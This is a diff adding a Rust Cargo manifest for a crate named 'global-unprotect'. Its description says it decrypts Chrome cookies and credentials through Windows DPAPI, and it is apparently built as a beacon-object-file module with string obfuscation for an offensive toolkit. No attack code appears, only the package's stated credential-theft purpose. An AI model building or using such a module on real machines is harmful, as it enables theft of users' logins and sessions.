@@ -1,0 +1,17 @@
+[package]
+name = "global-unprotect"
+version.workspace = true
+edition.workspace = true
+authors.workspace = true
+license.workspace = true
+description = "DPAPI decrypt (Chrome cookies / creds) via CryptUnprotectData — by Dani."
+
+[dependencies]
+rustbof.workspace = true
+common = { path = "../../common" }
+windows-sys = { workspace = true, features = ["Win32_Foundation", "Win32_Security_Cryptography"] }
+obfstr.workspace = true
+
+[lib]
+crate-type = ["staticlib"]
+name = "global_unprotect"
